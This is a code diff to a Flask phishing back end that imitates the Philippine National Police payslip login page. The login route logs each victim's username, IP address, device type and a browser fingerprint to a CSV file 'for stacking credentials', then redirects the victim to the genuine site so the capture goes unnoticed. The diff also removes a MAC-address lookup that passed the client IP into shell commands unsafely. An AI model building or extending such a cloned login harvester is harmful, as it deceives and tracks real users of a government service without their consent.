@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect #server for python 
+from flask import Flask, render_template, request, redirect, jsonify
 import csv # getting the configuration of csv
 import os # configuration/ portable way of using operating system
 import time #getting the time
@@ -6,6 +6,8 @@ import subprocess #allows you to spawn new processes, connect to their input/out
 import platform #used to retrieve as much possible information about the platform
 import re #provides regular expression matching operations
 import json #for returning JSON data
+import hashlib
+import uuid
 
 app = Flask(__name__)
 
@@ -62,15 +64,7 @@ def get_client_ip():
         if client_ip and client_ip != '127.0.0.1':
             return client_ip
     
-    # Add a unique identifier if multiple users share the same IP
-    ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent', '')
-    
-    # Return IP plus a fingerprint hash to help differentiate users behind same IP
-    import hashlib
-    fingerprint = hashlib.md5((user_agent + request.headers.get('Accept-Language', '')).encode()).hexdigest()[:8]
-    
-    return f"{ip} ({fingerprint})"
+    return request.remote_addr
 
 """
 Function to determine if the client is using a mobile or desktop device
@@ -82,77 +76,44 @@ def get_device_type():
         return 'Mobile'
     return 'Desktop'
 
-# function to fetch their mac address of a given ip address
-def get_mac_address(ip_address):
-    if ip_address == '127.0.0.1':
-        return 'localhost'
-
+def generate_device_fingerprint():
     """
-    Handle exception function that depends on their device they currently using and 
-    must be reachable depending on their os.
+    Generate a unique device fingerprint based on browser characteristics
+    This is more reliable than trying to get MAC addresses
     """
-
-    try:
-        # ensuring the ip is reachable by sending ping
-        if platform.system().lower() == "windows":
-            ping_cmd = f"ping -n 1 {ip_address}"
-            subprocess.call(ping_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            # extract mac address using arp command
-            output = subprocess.check_output(f"arp -a {ip_address}", shell=True).decode()
-            mac_matches = re.findall(r"([0-9A-Fa-f]{2}[-][0-9A-Fa-f]{2}[-][0-9A-Fa-f]{2}[-][0-9A-Fa-f]{2}[-][0-9A-Fa-f]{2}[-][0-9A-Fa-f]{2})", output)
-            if mac_matches:
-                return mac_matches[0].upper()
-        else:
-            # For linux user/macos users
-            ping_cmd = f"ping -c 1 {ip_address}"
-            subprocess.call(ping_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            # get the complete mac address
-            output = subprocess.check_output(f"arp -n {ip_address}", shell=True).decode()
-            mac_matches = re.findall(r"([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})", output)
-            if mac_matches:
-                return mac_matches[0].upper()
-            
-        # Alternative method for Linux
-        if platform.system().lower() != "windows":
-            try:
-                output = subprocess.check_output(f"ip neigh show {ip_address}", shell=True).decode()
-                mac_matches = re.findall(r"([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})", output)
-                if mac_matches:
-                    return mac_matches[0].upper() 
-            except:
-                pass
-
-        return ''  
-    except Exception as e:
-        print(f"Error getting MAC address: {str(e)}")  
-        return ''  
+    user_agent = request.headers.get('User-Agent', '')
+    accept_lang = request.headers.get('Accept-Language', '')
+    accept_encoding = request.headers.get('Accept-Encoding', '')
+    accept = request.headers.get('Accept', '')
+    
+    # Create a unique fingerprint from multiple browser characteristics
+    fingerprint_data = f"{user_agent}|{accept_lang}|{accept_encoding}|{accept}"
+    fingerprint = hashlib.sha256(fingerprint_data.encode()).hexdigest()[:16]
+    
+    return fingerprint
 
 # routing for handle requests
 @app.route('/login', methods=['POST'])
 def login():
     username = request.form.get('username')
-    # Note: Still receiving password from form but not using it
     
-    # getting client's IP address
+    # Get enhanced client information
     ip_address = get_client_ip()
-    
-    # getting their mac address and device type
-    mac_address = get_mac_address(ip_address)
     device_type = get_device_type()
+    device_fingerprint = generate_device_fingerprint()
+    browser_info = request.headers.get('User-Agent', '')
     
     if not username:
         return render_template('index.html', error="Please enter your username")
     
-    # save the credentials containing the names in every column
+    # Save the data
     timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
-    save_to_csv(username, timestamp, ip_address, mac_address, device_type)
+    save_to_csv(username, timestamp, ip_address, device_fingerprint, device_type, browser_info)
     
-    # looping from copycat-ed ui/ux of pnp payslip to it's original payslip
+    # Redirect to original site
     return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2F")
 
-def save_to_csv(username, timestamp, ip_address, mac_address, device_type):
+def save_to_csv(username, timestamp, ip_address, device_fingerprint, device_type, browser_info):
     """ 
     Get the directory where the script is located. The name for stacking credentials is 
     data.csv
@@ -170,11 +131,11 @@ def save_to_csv(username, timestamp, ip_address, mac_address, device_type):
             if file does not exist or is empty, it will write header
             """
             if not file_exists or os.stat(csv_path).st_size == 0:
-                writer.writerow(['username', 'timestamp', 'ip_address', 'mac_address', 'device_type'])
+                writer.writerow(['username', 'timestamp', 'ip_address', 'device_fingerprint', 'device_type', 'browser_info'])
                 csvfile.flush()
 
             # append login credentials (without password)
-            writer.writerow([username, timestamp, ip_address, mac_address, device_type])
+            writer.writerow([username, timestamp, ip_address, device_fingerprint, device_type, browser_info])
             csvfile.flush()
     except PermissionError:
         
@@ -187,10 +148,10 @@ def save_to_csv(username, timestamp, ip_address, mac_address, device_type):
             writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
             
             if not os.path.exists(fallback_path) or os.stat(fallback_path).st_size == 0:
-                writer.writerow(['username', 'timestamp', 'ip_address', 'mac_address', 'device_type'])
+                writer.writerow(['username', 'timestamp', 'ip_address', 'device_fingerprint', 'device_type', 'browser_info'])
                 csvfile.flush()
             
-            writer.writerow([username, timestamp, ip_address, mac_address, device_type])
+            writer.writerow([username, timestamp, ip_address, device_fingerprint, device_type, browser_info])
             csvfile.flush()
 
 # Add a route to view statistics with access key protection
